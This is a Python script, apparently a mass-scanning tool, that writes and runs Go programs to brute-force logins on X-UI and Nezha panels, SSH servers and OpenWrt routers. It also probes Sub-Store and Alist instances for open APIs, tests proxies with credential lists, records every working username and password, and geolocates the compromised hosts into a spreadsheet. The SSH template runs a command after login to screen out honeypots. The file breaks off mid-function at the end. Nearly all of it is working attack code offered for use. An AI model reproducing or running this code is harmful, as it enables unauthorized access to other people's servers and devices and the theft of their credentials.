# -*- coding: utf-8 -*-
import os
import base64
import subprocess
import time
import shutil
import sys
import atexit
import re
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== 依赖导入强化 ====================
try:
    import psutil
    import requests
    import yaml
    from openpyxl import Workbook, load_workbook
    from tqdm import tqdm
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError as e:
    print(f"❌ 错误：核心 Python 模块缺失！")
    print(f"   缺失的模块是: {e.name}")
    print("   请先手动安装所有依赖：")
    print("   python3 -m pip install psutil requests pyyaml openpyxl tqdm colorama --break-system-packages")
    sys.exit(1)

try:
    import readline
except ImportError:
    pass
# =================================================

# ==================== 全局变量 ====================
TIMEOUT = 5
VERBOSE_DEBUG = False

# =========================== Go 模板 (带详细注释) ===========================
# === 模板 1: XUI 面板 ===
XUI_GO_TEMPLATE_1_LINES = [
    "package main", "import (", "	\"bufio\"", "	\"context\"", "	\"crypto/tls\"", "	\"encoding/json\"", "	\"fmt\"", "	\"io\"", "	\"net/http\"", "	\"net/url\"", "	\"os\"", "	\"strings\"", "	\"sync\"", "	\"time\"", ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {", "	defer wg.Done()",
    "	tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, DisableKeepAlives: true }",
    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks { processIP(line, file, usernames, passwords, httpClient) }", "}",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {", "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line)); if err == nil && u.Host != \"\" { ipPort = u.Host } else { ipPort = strings.TrimSpace(line) }",
    "	parts := strings.Split(ipPort, \":\"); if len(parts) != 2 { return }", "	ip, port := parts[0], parts[1]",
    "	for _, username := range usernames {", "		for _, password := range passwords {", "			var resp *http.Response; var err error",
    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/login\", ip, port)",
    "			payloadHttp := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(payloadHttp))",
    "			reqHttp.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "			resp, err = httpClient.Do(reqHttp); cancel()",
    "			if err != nil {", "				if resp != nil { resp.Body.Close() }",
    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "				checkURLHttps := fmt.Sprintf(\"https://%s:%s/login\", ip, port)",
    "				payloadHttps := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(payloadHttps))",
    "				reqHttps.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "				resp, err = httpClient.Do(reqHttps); cancel2()", "			}",
    "			if err != nil { if resp != nil { resp.Body.Close() }; continue }",
    "			if resp.StatusCode == http.StatusOK {",
    "				body, readErr := io.ReadAll(resp.Body)",
    "				if readErr == nil {", "					var responseData map[string]interface{}",
    "					if json.Unmarshal(body, &responseData) == nil {",
    "						if success, ok := responseData[\"success\"].(bool); ok && success {",
    "							file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "							resp.Body.Close(); return", "						}", "					}", "				}", "			}",
    "			io.Copy(io.Discard, resp.Body); resp.Body.Close()", "		}", "	}", "}",
    "func main() {", "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile); if err != nil { return }", "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); if err != nil { return }", "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	if len(usernames) == 0 || len(passwords) == 0 { return }",
    "	tasks := make(chan string, {semaphore_size}); var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { wg.Add(1); go worker(tasks, outFile, &wg, usernames, passwords) }",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() { line := strings.TrimSpace(scanner.Text()); if line != \"\" { tasks <- line } }",
    "	close(tasks); wg.Wait()", "}",
]
# === 模板 2: 哪吒面板 ===
XUI_GO_TEMPLATE_2_LINES = [
    "package main", "import (", "	\"bufio\"", "	\"context\"", "	\"crypto/tls\"", "	\"encoding/json\"", "	\"fmt\"", "	\"io\"", "	\"net/http\"", "	\"net/url\"", "	\"os\"", "	\"strings\"", "	\"sync\"", "	\"time\"", ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {", "	defer wg.Done()",
    "	tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, DisableKeepAlives: true }",
    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks { processIP(line, file, usernames, passwords, httpClient) }", "}",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {", "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line)); if err == nil && u.Host != \"\" { ipPort = u.Host } else { ipPort = strings.TrimSpace(line) }",
    "	parts := strings.Split(ipPort, \":\"); if len(parts) != 2 { return }", "	ip, port := parts[0], parts[1]",
    "	for _, username := range usernames {", "		for _, password := range passwords {", "			var resp *http.Response; var err error",
    "			data := map[string]string{\"username\": username, \"password\": password}",
    "			jsonPayload, _ := json.Marshal(data)",
    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/api/v1/login\", ip, port)",
    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(string(jsonPayload)))",
    "			reqHttp.Header.Set(\"Content-Type\", \"application/json\")",
    "			resp, err = httpClient.Do(reqHttp); cancel()",
    "			if err != nil {", "				if resp != nil { resp.Body.Close() }",
    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "				checkURLHttps := fmt.Sprintf(\"https://%s:%s/api/v1/login\", ip, port)",
    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(string(jsonPayload)))",
    "				reqHttps.Header.Set(\"Content-Type\", \"application/json\")",
    "				resp, err = httpClient.Do(reqHttps); cancel2()", "			}",
    "			if err != nil { if resp != nil { resp.Body.Close() }; continue }",
    "			if resp.StatusCode == http.StatusOK {",
    "				body, readErr := io.ReadAll(resp.Body)",
    "				if readErr == nil {", "					var responseData map[string]interface{}",
    "					if json.Unmarshal(body, &responseData) == nil {",
    "						if success, ok := responseData[\"success\"].(bool); ok && success {",
    "							file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
    "							resp.Body.Close(); return", "						}", "					}", "				}", "			}",
    "			io.Copy(io.Discard, resp.Body); resp.Body.Close()", "		}", "	}", "}",
    "func main() {", "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile); if err != nil { return }", "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); if err != nil { return }", "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	if len(usernames) == 0 || len(passwords) == 0 { return }",
    "	tasks := make(chan string, {semaphore_size}); var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { wg.Add(1); go worker(tasks, outFile, &wg, usernames, passwords) }",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() { line := strings.TrimSpace(scanner.Text()); if line != \"\" { tasks <- line } }",
    "	close(tasks); wg.Wait()", "}",
]
# === 模板 6: SSH ===
XUI_GO_TEMPLATE_6_LINES = [
    "package main", "import (", "	\"bufio\"", "	\"fmt\"", "	\"log\"", "	\"net/url\"", "	\"os\"", "	\"strings\"", "	\"sync\"", "	\"time\"", "	\"golang.org/x/crypto/ssh\"", ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {", "	defer wg.Done()",
    "	for line := range tasks { processIP(line, file, usernames, passwords) }", "}",
    "func processIP(line string, file *os.File, usernames []string, passwords []string) {", "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line)); if err == nil && u.Host != \"\" { ipPort = u.Host } else { ipPort = strings.TrimSpace(line) }",
    "	parts := strings.Split(ipPort, \":\"); if len(parts) != 2 { return }", "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "   log.Printf(\"Scanning SSH: %s:%s\", ip, port)",
    "	for _, username := range usernames {", "		for _, password := range passwords {",
    "			client, success, _ := trySSH(ip, port, username, password)",
    "			if success {", "				if !isLikelyHoneypot(client) { file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password)) }",
    "				client.Close(); return", "			}", "		}", "	}", "}",
    "func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {", "	addr := fmt.Sprintf(\"%s:%s\", ip, port)",
    "	config := &ssh.ClientConfig{ User: username, Auth: []ssh.AuthMethod{ssh.Password(password)}, HostKeyCallback: ssh.InsecureIgnoreHostKey(), Timeout: {timeout} * time.Second }",
    "	client, err := ssh.Dial(\"tcp\", addr, config); return client, err == nil, err", "}",
    "func isLikelyHoneypot(client *ssh.Client) bool {",
    "	session, err := client.NewSession(); if err != nil { return true }", "	defer session.Close()",
    "	err = session.RequestPty(\"xterm\", 80, 40, ssh.TerminalModes{}); if err != nil { return true }",
    "	output, err := session.CombinedOutput(\"echo $((1+1))\"); if err != nil { return true }",
    "	return strings.TrimSpace(string(output)) != \"2\"", "}",
    "func main() {", "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile); if err != nil { return }", "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); if err != nil { return }", "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size}); var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { wg.Add(1); go worker(tasks, outFile, &wg, usernames, passwords) }",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() { line := strings.TrimSpace(scanner.Text()); if line != \"\" { tasks <- line } }",
    "	close(tasks); wg.Wait()", "}",
]
# === 模板 7: Sub Store ===
XUI_GO_TEMPLATE_7_LINES = [
    "package main", "import (", "	\"bufio\"", "	\"context\"", "	\"crypto/tls\"", "	\"fmt\"", "	\"io\"", "	\"net/http\"", "	\"net/url\"", "	\"os\"", "	\"strings\"", "	\"sync\"", "	\"time\"", ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []string) {", "	defer wg.Done()",
    "	tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, DisableKeepAlives: true }",
    "	client := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	for line := range tasks { processIP(line, file, paths, client) }", "}",
    "func processIP(line string, file *os.File, paths []string, client *http.Client) {", "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line)); if err == nil && u.Host != \"\" { ipPort = u.Host } else { ipPort = strings.TrimSpace(line) }",
    "	for _, path := range paths { if tryBothProtocols(ipPort, path, client, file) { break } }", "}",
    "func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {",
    "	cleanPath := strings.Trim(path, \"/\")", "	fullPath := cleanPath + \"/api/utils/env\"",
    "	if success, _ := sendRequest(client, fmt.Sprintf(\"http://%s/%s\", ipPort, fullPath)); success {",
    "		file.WriteString(fmt.Sprintf(\"http://%s?api=http://%s/%s\\n\", ipPort, ipPort, cleanPath)); return true", "	}",
    "	if success, _ := sendRequest(client, fmt.Sprintf(\"https://%s/%s\", ipPort, fullPath)); success {",
    "		file.WriteString(fmt.Sprintf(\"https://%s?api=https://%s/%s\\n\", ipPort, ipPort, cleanPath)); return true", "	}",
    "	return false", "}",
    "func sendRequest(client *http.Client, fullURL string) (bool, error) {",
    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second); defer cancel()",
    "	req, err := http.NewRequestWithContext(ctx, \"GET\", fullURL, nil); if err != nil { return false, err }",
    "	resp, err := client.Do(req)",
    "	if err != nil { if resp != nil { resp.Body.Close() }; return false, err }", "	defer resp.Body.Close()",
    "	if resp.StatusCode == http.StatusOK {",
    "		bodyBytes, readErr := io.ReadAll(resp.Body); if readErr != nil { return false, readErr }",
    "		if strings.Contains(string(bodyBytes), `{\"status\":\"success\",\"data\"`) { return true, nil }", "	}",
    "	io.Copy(io.Discard, resp.Body); return false, nil", "}",
    "func main() {", "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile); if err != nil { return }", "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); if err != nil { return }", "	defer outFile.Close()",
    "	paths := {pass_list}",
    "	tasks := make(chan string, {semaphore_size}); var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { wg.Add(1); go worker(tasks, outFile, &wg, paths) }",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() { line := strings.TrimSpace(scanner.Text()); if line != \"\" { tasks <- line } }",
    "	close(tasks); wg.Wait()", "}",
]
# === 模板 8: OpenWrt / iStoreOS ===
XUI_GO_TEMPLATE_8_LINES = [
    "package main", "import (", "	\"bufio\"", "	\"context\"", "	\"crypto/tls\"", "	\"fmt\"", "	\"io\"", "	\"net/http\"", "	\"net/url\"", "	\"os\"", "	\"strings\"", "	\"sync\"", "	\"time\"", ")",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {", "	defer wg.Done()",
    "	tr := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, DisableKeepAlives: true }",
    "	client := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second, CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse } }",
    "	for line := range tasks { processIP(line, file, usernames, passwords, client) }", "}",
    "func processIP(line string, file *os.File, usernames []string, passwords []string, client *http.Client) {",
    "	targets := []string{}; trimmed := strings.TrimSpace(line)",
    "	if strings.HasPrefix(trimmed, \"http\") { targets = append(targets, trimmed) } else { targets = append(targets, \"http://\"+trimmed, \"https://\"+trimmed) }",
    "	for _, target := range targets {", "		u, err := url.Parse(target); if err != nil { continue }",
    "		origin := u.Scheme + \"://\" + u.Host; referer := origin + \"/\"",
    "		for _, username := range usernames {", "			for _, password := range passwords {",
    "				if checkLogin(target, username, password, origin, referer, client) {",
    "					file.WriteString(fmt.Sprintf(\"%s %s %s\\n\", target, username, password)); return", "				}", "			}", "		}", "	}", "}",
    "func checkLogin(urlStr, username, password, origin, referer string, client *http.Client) bool {",
    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second); defer cancel()",
    "	payload := fmt.Sprintf(\"luci_username=%s&luci_password=%s\", username, password)",
    "	req, err := http.NewRequestWithContext(ctx, \"POST\", urlStr, strings.NewReader(payload)); if err != nil { return false }",
    "	req.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\"); req.Header.Set(\"Origin\", origin); req.Header.Set(\"Referer\", referer)",
    "	resp, err := client.Do(req); if err != nil { if resp != nil { resp.Body.Close() }; return false }", "	defer resp.Body.Close()",
    "	io.Copy(io.Discard, resp.Body)",
    "	for _, c := range resp.Cookies() { if c.Name == \"sysauth_http\" && c.Value != \"\" { return true } }",
    "	return false", "}",
    "func main() {", "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile); if err != nil { return }", "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); if err != nil { return }", "	defer outFile.Close()",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size}); var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { wg.Add(1); go worker(tasks, outFile, &wg, usernames, passwords) }",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() { line := strings.TrimSpace(scanner.Text()); if line != \"\" { tasks <- line } }",
    "	close(tasks); wg.Wait()", "}",
]
# === 代理测试模板 ===
PROXY_GO_TEMPLATE_LINES = [
    "package main", "import (", "	\"bufio\"", "	\"context\"", "	\"crypto/tls\"", "	\"fmt\"", "	\"io/ioutil\"", "	\"net\"", "	\"net/http\"", "	\"net/url\"", "	\"os\"", "	\"strings\"", "	\"sync\"", "	\"time\"", "	\"golang.org/x/net/proxy\"", ")",
    "var ( proxyType = \"{proxy_type}\"; authMode = {auth_mode}; testURL = \"\"; realIP = \"\" )",
    "func worker(tasks <-chan string, outputFile *os.File, wg *sync.WaitGroup) {", "	defer wg.Done()",
    "	for proxyAddr := range tasks { processProxy(proxyAddr, outputFile) }", "}",
    "func processProxy(proxyAddr string, outputFile *os.File) {", "	var found bool",
    "	checkAndFormat := func(auth *proxy.Auth) {", "		if found { return }",
    "		success, _ := checkConnection(proxyAddr, auth)",
    "		if success {", "			found = true; var result string",
    "			if auth != nil && auth.User != \"\" { result = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr) } else { result = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr) }",
    "			outputFile.WriteString(result + \"\\n\")", "		}", "	}",
    "	switch authMode {", "	case 1: checkAndFormat(nil)",
    "	case 2:", "		usernames, passwords := {user_list}, {pass_list}",
    "		for _, user := range usernames { for _, pass := range passwords { if found { return }; auth := &proxy.Auth{User: user, Password: pass}; checkAndFormat(auth) } }",
    "	case 3:", "		credentials := {creds_list}",
    "		for _, cred := range credentials { if found { return }; parts := strings.SplitN(cred, \":\", 2); if len(parts) == 2 { auth := &proxy.Auth{User: parts[0], Password: parts[1]}; checkAndFormat(auth) } }",
    "	}", "}",
    "func getPublicIP(targetURL string) (string, error) {",
    "	client := &http.Client{Timeout: 15 * time.Second}",
    "	req, err := http.NewRequest(\"GET\", targetURL, nil); if err != nil { return \"\", err }",
    "	req.Header.Set(\"User-Agent\", \"curl/7.79.1\")",
    "	resp, err := client.Do(req); if err != nil { return \"\", err }", "	defer resp.Body.Close()",
    "	body, err := ioutil.ReadAll(resp.Body); if err != nil { return \"\", err }", "	ipString := string(body)",
    "	if strings.Contains(ipString, \"当前 IP：\") { parts := strings.Split(ipString, \"：\"); if len(parts) > 1 { ipParts := strings.Split(parts[1], \" \"); return ipParts[0], nil } }",
    "	return strings.TrimSpace(ipString), nil", "}",
    "func checkConnection(proxyAddr string, auth *proxy.Auth) (bool, error) {",
    "	transport := &http.Transport{ TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, DisableKeepAlives: true }",
    "	timeout := {timeout} * time.Second",
    "	if proxyType == \"http\" || proxyType == \"https\" {", "		var proxyURLString string",
    "		if auth != nil && auth.User != \"\" { proxyURLString = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr) } else { proxyURLString = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr) }",
    "		proxyURL, err := url.Parse(proxyURLString); if err != nil { return false, err }", "		transport.Proxy = http.ProxyURL(proxyURL)",
    "		if proxyType == \"https\" { transport.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) { dialer := &net.Dialer{Timeout: timeout}; return tls.DialWithDialer(dialer, network, proxyAddr, &tls.Config{InsecureSkipVerify: true}) } }",
    "	} else {", "		dialer, err := proxy.SOCKS5(\"tcp\", proxyAddr, auth, &net.Dialer{ Timeout: timeout, KeepAlive: 30 * time.Second }); if err != nil { return false, err }",
    "		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) { return dialer.Dial(network, addr) }", "	}",
    "	httpClient := &http.Client{ Transport: transport, Timeout: timeout }",
    "	req, err := http.NewRequest(\"GET\", testURL, nil); if err != nil { return false, err }",
    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "	resp, err := httpClient.Do(req); if err != nil { if resp != nil { resp.Body.Close() }; return false, err }", "	defer resp.Body.Close()",
    "	body, readErr := ioutil.ReadAll(resp.Body); if readErr != nil { return false, fmt.Errorf(\"无法读取响应\") }", "	proxyIP := string(body)",
    "	if strings.Contains(proxyIP, \"当前 IP：\") { parts := strings.Split(proxyIP, \"：\"); if len(parts) > 1 { ipParts := strings.Split(parts[1], \" \"); proxyIP = ipParts[0] } }",
    "	proxyIP = strings.TrimSpace(proxyIP)",
    "	if realIP == \"UNKNOWN\" || proxyIP == \"\" { return false, fmt.Errorf(\"无法获取IP验证\") }",
    "	if proxyIP == realIP { return false, fmt.Errorf(\"透明代理\") }", "	return true, nil", "}",
    "func main() {", "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]", "	var err error",
    "	testURL = os.Getenv(\"TEST_URL\")",
    "	realIP, err = getPublicIP(testURL); if err != nil { realIP = \"UNKNOWN\" }",
    "	proxies, err := os.Open(inputFile); if err != nil { return }", "	defer proxies.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); if err != nil { return }", "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size}); var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { wg.Add(1); go worker(tasks, outFile, &wg) }",
    "	scanner := bufio.NewScanner(proxies)",
    "	for scanner.Scan() { proxyAddr := strings.TrimSpace(scanner.Text()); if proxyAddr != \"\" { tasks <- proxyAddr } }",
    "	close(tasks); wg.Wait()", "}",
]
# === 模板 9: Alist 面板 ===
ALIST_GO_TEMPLATE_LINES = [
    "package main", "import (", "	\"bufio\"", "	\"context\"", "	\"crypto/tls\"", "	\"encoding/json\"", "	\"fmt\"", "	\"io\"", "	\"net\"", "	\"net/http\"", "	\"os\"", "	\"strings\"", "	\"sync\"", "	\"time\"", ")",
    "func createHttpClient() *http.Client {",
    "	tr := &http.Transport{ Proxy: http.ProxyFromEnvironment, DialContext: (&net.Dialer{ Timeout: {timeout} * time.Second, KeepAlive: 0 }).DialContext, TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, TLSHandshakeTimeout: {timeout} * time.Second, ResponseHeaderTimeout: {timeout} * time.Second, ExpectContinueTimeout: 1 * time.Second, ForceAttemptHTTP2: false, DisableKeepAlives: true }",
    "	return &http.Client{ Transport: tr, Timeout: ({timeout} + 1) * time.Second }", "}",
    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {", "	defer wg.Done()",
    "	httpClient := createHttpClient()",
    "	for ipPort := range tasks { processIP(ipPort, file, httpClient) }", "}",
    "func processIP(ipPort string, file *os.File, httpClient *http.Client) {",
    "	parts := strings.SplitN(ipPort, \":\", 2); if len(parts) != 2 { return }", "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "	for _, proto := range []string{\"http\", \"https\"} {", "		base := fmt.Sprintf(\"%s://%s:%s\", proto, ip, port)",
    "		testURL := base + \"/api/me\"",
    "		ctx, cancel := context.WithTimeout(context.Background(), ({timeout} + 1) * time.Second)",
    "		req, err := http.NewRequestWithContext(ctx, \"GET\", testURL, nil); if err != nil { cancel(); continue }",
    "		req.Header.Set(\"User-Agent\", \"Mozilla/5.0\"); req.Header.Set(\"Connection\", \"close\")",
    "		resp, err := httpClient.Do(req); cancel()",
    "		if err != nil { if resp != nil { resp.Body.Close() }; continue }",
    "		if isValidResponse(resp) { file.WriteString(base + \"\\n\"); resp.Body.Close(); return }",
    "		resp.Body.Close()", "	}", "}",
    "func isValidResponse(resp *http.Response) bool {",
    "	if resp == nil { return false }",
    "	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024)); if err != nil { return false }",
    "	var data map[string]interface{}; if err := json.Unmarshal(body, &data); err != nil { return false }",
    "	if v, ok := data[\"code\"]; ok {", "		switch t := v.(type) {",
    "		case float64: return int(t) == 200", "		case string: return t == \"200\"", "		}", "	}",
    "	return false", "}",
    "func main() {", "	if len(os.Args) < 3 { os.Exit(1) }",
    "	inputFile, outputFile := os.Args[1], os.Args[2]",
    "	batch, err := os.Open(inputFile); if err != nil { return }", "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644); if err != nil { return }", "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size}); var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ { wg.Add(1); go worker(tasks, outFile, &wg) }",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {", "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { fields := strings.Fields(line); if len(fields) > 0 { tasks <- fields[0] } }", "	}",
    "	close(tasks); wg.Wait()", "}",
]

# =========================== ipcx.py 内容 (已集成) ===========================
IPCX_PY_CONTENT = r"""import requests, time, os, re, sys, json
from openpyxl import Workbook, load_workbook
from openpyxl.utils import get_column_letter
from tqdm import tqdm

def adjust_column_width(ws):
    for col in ws.columns:
        max_length = 0; column = col[0].column; column_letter = get_column_letter(column)
        for cell in col:
            try:
                if cell.value:
                    length = len(str(cell.value))
                    if length > max_length: max_length = length
            except: pass
        ws.column_dimensions[column_letter].width = max_length + 2

def extract_ip_port(url):
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/]+:\d+)', url)
    if match: return match.group(3)
    match = re.search(r'([^:/\s]+:\d+)', url)
    if match: return match.group(1)
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/\s]+)', url)
    if match: return match.group(3)
    return url.split()[0]

def get_ip_info_batch(ip_list, retries=3):
    url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"; results = {}
    payload = [{"query": ip.split(':')[0]} for ip in ip_list]
    for attempt in range(retries):
        try:
            response = requests.post(url, json=payload, timeout=20); response.raise_for_status(); data = response.json()
            for item in data:
                original_ip_port = next((ip for ip in ip_list if ip.startswith(item.get('query', ''))), None)
                if original_ip_port:
                    if item.get('status') == 'success':
                        results[original_ip_port] = [original_ip_port, item.get('country', 'N/A'), item.get('regionName', 'N/A'), item.get('city', 'N/A'), item.get('isp', 'N/A')]
                    else: results[original_ip_port] = [original_ip_port, '查询失败', '查询失败', '查询失败', '查询失败']
            for ip_port in ip_list:
                if ip_port not in results: results[ip_port] = [ip_port, 'N/A', 'N/A', 'N/A', 'N/A']
            return [results[ip_port] for ip_port in ip_list]
        except requests.exceptions.RequestException as e:
            if attempt < retries - 1: time.sleep(2)
            else: return [[ip_port, '超时/错误', '超时/错误', '超时/错误', '超时/错误'] for ip_port in ip_list]
    return [[ip_port, 'N/A', 'N/A', 'N/A', 'N/A'] for ip_port in ip_list]

def process_ip_port_file(input_file, output_excel):
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f: lines = [line.strip() for line in f if line.strip()]
    headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']
    if os.path.exists(output_excel):
        try: os.remove(output_excel)
        except OSError as e: print(f"无法删除旧的Excel文件 '{output_excel}': {e}。请手动关闭它。"); return
    wb = Workbook(); ws = wb.active; ws.title = "IP信息"; ws.append(headers); wb.save(output_excel)
    targets = []
    for line in lines:
        addr, user, passwd = line, '', ''
        try:
            proxy_match = re.match(r'(\w+://)(?:([^:]+):([^@]+)@)?(.+)', line)
            if proxy_match: user, passwd, addr = proxy_match.group(2) or '', proxy_match.group(3) or '', f"{proxy_match.group(1)}{proxy_match.group(4)}"
            else:
                parts = line.split()
                if len(parts) >= 3: addr, user, passwd = parts[0], parts[1], parts[2]
                elif len(parts) == 2: addr, user = parts[0], parts[1]
                else: addr = parts[0]
        except Exception: addr = line.split()[0] if line.split() else ''
        ip_port = extract_ip_port(addr)
        if ip_port: targets.append({'line': line, 'ip_port': ip_port, 'user': user, 'passwd': passwd})
    chunk_size = 100
    with tqdm(total=len(targets), desc="IP信息查询", unit="ip", ncols=100) as pbar:
        for i in range(0, len(targets), chunk_size):
            chunk = targets[i:i+chunk_size]; ip_ports_in_chunk = [target['ip_port'] for target in chunk]
            batch_results = get_ip_info_batch(ip_ports_in_chunk)
            wb = load_workbook(output_excel); ws = wb.active
            for original_target, result_data in zip(chunk, batch_results):
                row = [original_target['line'], result_data[0], original_target['user'], original_target['passwd']] + result_data[1:]
                ws.append(row)
            wb.save(output_excel); pbar.update(len(chunk))
            if i + chunk_size < len(targets): time.sleep(4.5)
    wb = load_workbook(output_excel); ws = wb.active; adjust_column_width(ws); wb.save(output_excel)
    print("\nIP信息查询完成！")

if __name__ == "__main__":
    if len(sys.argv) > 2: process_ip_port_file(sys.argv[1], sys.argv[2])
"""

def generate_ipcx_py():
    with open('ipcx.py', 'w', encoding='utf-8') as f:
        f.write(IPCX_PY_CONTENT)

# =========================== 哪吒面板分析函数 ===========================
def analyze_panel(result_line):
    parts = result_line.split()
    if len(parts) < 3: return result_line, (0, 0, "格式错误")
    ip_port, username, password = parts[0], parts[1], parts[2]
    for protocol in ["http", "https"]:
